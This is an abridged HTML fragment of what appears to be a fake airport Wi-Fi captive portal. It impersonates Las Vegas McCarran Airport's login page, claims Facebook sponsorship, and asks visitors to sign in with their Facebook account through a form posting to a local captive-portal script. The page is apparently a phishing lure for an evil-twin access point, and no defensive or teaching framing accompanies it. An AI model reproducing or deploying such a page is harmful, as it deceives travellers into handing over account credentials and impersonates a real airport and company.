...
<html>
  ...
  <head>
    ...
    <title>Welcome to Mccarran - Log In</title>
  ...
  <body>
    ...
    <h1>Welcome to Mccarran  Airport wifi</h1>
    <div>Internet Access at Las Vegas McCarran LAS Airport</div>
    <br/><br/>
      <img src="assets/img/mcclogo.png" class="logo"/>
      <h1 class="disable-selection">sponsored by Facebook</h1>
      <br/><br/>
        <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
            For free high speed internet login with your facebook account.<br/><br/>
        ...
        Free high-speed Wi-Fi service is available in all public areas of the Airport.
